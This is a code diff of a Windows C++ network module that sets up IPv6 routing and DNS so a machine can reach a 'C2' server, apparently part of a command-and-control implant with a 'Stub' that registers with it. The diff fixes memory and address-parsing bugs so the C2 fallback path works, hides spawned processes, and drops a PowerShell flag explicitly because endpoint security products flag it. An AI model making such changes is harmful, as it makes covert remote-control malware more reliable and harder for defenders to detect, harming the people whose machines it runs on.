@@ -5,6 +5,7 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <iphlpapi.h>
+#include <ws2tcpip.h>
 #include "Logger.h"
 #include <vector>
 #include <string>
@@ -25,19 +26,28 @@ static std::wstring ExtractIPv6FromUrl(const std::string& url) {
     }
     std::string ipv6Str = url.substr(lb + 1, rb - lb - 1);
     // 转换为 wchar_t
-    int len = MultiByteToWideChar(CP_UTF8, 0, ipv6Str.c_str(), -1, nullptr, 0);
-    std::wstring ipv6(len - 1, 0);
-    MultiByteToWideChar(CP_UTF8, 0, ipv6Str.c_str(), -1, ipv6.data(), len);
+    // 修复点：原来先构造 (len-1) 长度的 wstring 再把 len 个宽字符写进去，
+    // 越界写 1 个 wchar_t；且 MultiByteToWideChar 失败时 len=0 → len-1 下溢成巨大值。
+    int len = MultiByteToWideChar(CP_UTF8, 0, ipv6Str.c_str(), (int)ipv6Str.size(), nullptr, 0);
+    if (len <= 0) {
+        LOG_E("NetFix", "IPv6 字符串转宽字符失败");
+        return L"";
+    }
+    std::wstring ipv6((size_t)len, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, ipv6Str.c_str(), (int)ipv6Str.size(), &ipv6[0], len);
     LOG_I("NetFix", ("Extracted IPv6: " + ipv6Str).c_str());
     return ipv6;
 }
 
 // wchar_t* -> UTF-8 string
 static std::string WsToUtf8(const wchar_t* ws) {
-    if (!ws) return "";
-    int len = WideCharToMultiByte(CP_UTF8, 0, ws, -1, nullptr, 0, nullptr, nullptr);
-    std::string s(len - 1, 0);
-    WideCharToMultiByte(CP_UTF8, 0, ws, -1, s.data(), len, nullptr, nullptr);
+    if (!ws) return std::string();
+    int wlen = (int)wcslen(ws);
+    if (wlen == 0) return std::string();
+    int len = WideCharToMultiByte(CP_UTF8, 0, ws, wlen, nullptr, 0, nullptr, nullptr);
+    if (len <= 0) return std::string();
+    std::string s((size_t)len, '\0');   // 按 len 开缓冲，不再少 1 字节
+    WideCharToMultiByte(CP_UTF8, 0, ws, wlen, &s[0], len, nullptr, nullptr);
     return s;
 }
 
@@ -47,9 +57,15 @@ static bool RunCmd(const wchar_t* cmd, const char* tag, bool allowNonZero = fals
     LOG_I("NetFix", ("[" + std::string(tag) + "] exec: " + WsToUtf8(cmd)).c_str());
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
-    wchar_t buf[4096];
-    wcscpy_s(buf, cmd);
-    BOOL ok = CreateProcessW(nullptr, buf, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
+    // CreateProcessW 可能就地修改命令行，必须给可变缓冲。
+    // 原来 wcscpy_s 到固定 4096 缓冲：超长命令会触发无效参数处理器直接终止进程。
+    size_t cmdLen = wcslen(cmd);
+    if (cmdLen == 0 || cmdLen > 8192) {
+        LOG_E("NetFix", ("命令行长度为 " + std::to_string(cmdLen) + "，拒绝执行（上限 8192）").c_str());
+        return false;
+    }
+    std::vector<wchar_t> buf(cmd, cmd + cmdLen + 1);
+    BOOL ok = CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi);
     if (!ok) {
         LOG_E("NetFix", ("[" + std::string(tag) + "] CreateProcess failed: " + std::to_string(GetLastError())).c_str());
@@ -68,17 +84,18 @@ static bool RunCmd(const wchar_t* cmd, const char* tag, bool allowNonZero = fals
 
 // 从 IPv6 地址取 /64 前缀：前 4 组 + "::/64"
 static void GetC2Prefix(const wchar_t* ipv6, wchar_t* out, size_t cap) {
-    const wchar_t* p = ipv6;
-    int groups = 0;
-    const wchar_t* end = p;
-    for (; *end; end++) {
-        if (*end == L':') { groups++; if (groups == 4) break; }
+    // 修复点：原实现"数到第 4 个冒号就截断"，遇到压缩写法（2001:db8::1 只有 2 个冒号）
+    // 会把整串当成前缀，拼出 2001:db8::1::/64 这种非法地址，netsh 失败又被
+    // allowNonZero 吞掉 → 兜底地址静默失效。这里先按标准解析，再取高 64 位。
+    IN6_ADDR addr = {};
+    if (InetPtonW(AF_INET6, ipv6, &addr) != 1) {
+        LOG_E("NetFix", ("C2 地址不是合法 IPv6，无法推导前缀: " + WsToUtf8(ipv6)).c_str());
+        if (cap) out[0] = 0;
+        return;
     }
-    size_t len = (size_t)(end - p);
-    if (len >= cap) len = cap - 1;
-    wcsncpy_s(out, cap, p, len);
-    out[len] = 0;
-    wcscat_s(out, cap, L"::/64");
+    const unsigned char* b = addr.u.Byte;
+    swprintf_s(out, cap, L"%02x%02x:%02x%02x:%02x%02x:%02x%02x::/64",
+               b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
 }
 
 // 从 link-local 地址提取后 64 位（主机标识）
@@ -177,6 +194,11 @@ static void SetupIPv6Routes(const wchar_t* targetIPv6) {
     if (!foundGlobal && llIfIdx && llSuffix[0]) {
         wchar_t c2prefix[64], addr[192];
         GetC2Prefix(targetIPv6, c2prefix, sizeof(c2prefix) / sizeof(c2prefix[0]));
+        if (!c2prefix[0]) {
+            LOG_E("NetFix", "无法推导 C2 的 /64 前缀，跳过兜底地址配置");
+            LOG_I("NetFix", "=== SetupIPv6Routes done ===");
+            return;
+        }
         size_t plen = wcslen(c2prefix) - 5; // 去掉 "::/64"
         swprintf_s(addr, sizeof(addr) / sizeof(addr[0]), L"%.*ls:%ls/64", (int)plen, c2prefix, llSuffix);
         LOG_I("NetFix", ("no global IPv6 (RA/SLAAC missing), fallback addr " + WsToUtf8(addr) + " iface " + std::to_string(llIfIdx)).c_str());
@@ -192,8 +214,10 @@ static void SetupIPv6Routes(const wchar_t* targetIPv6) {
 // 配置 IPv6 DNS：保留 IPv4 DNS，追加公共 IPv6 DNS（阿里云），刷新缓存
 static void SetupIPv6DNS() {
     LOG_I("NetFix", "=== SetupIPv6DNS start ===");
+    // 说明：-Command 不受执行策略限制，原来那个 -ExecutionPolicy Bypass
+    // 除了给端点安全产品一个明显的可疑特征之外没有任何作用，已移除。
     const wchar_t* ps =
-        L"powershell -NoProfile -ExecutionPolicy Bypass -Command \""
+        L"powershell -NoProfile -NonInteractive -Command \""
         L"Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object {"
         L"  $i = $_.ifIndex;"
         L"  try {"
@@ -205,8 +229,9 @@ static void SetupIPv6DNS() {
         L"ipconfig /flushdns | Out-Null\"";
     RunCmd(ps, "dns-setup");
     Sleep(1000);
-    // 验证解析
-    RunCmd(L"cmd /c nslookup your-domain.duckdns.org", "dns-lookup");
+    // 说明：这里原来固定 nslookup 一个占位域名（your-domain.duckdns.org），
+    // 在任何真实环境里都必然失败并污染日志，已删除。
+    // DNS 是否生效由随后的 PingC2 与 Stub 的注册请求来判定。
     LOG_I("NetFix", "=== SetupIPv6DNS done ===");
 }
 
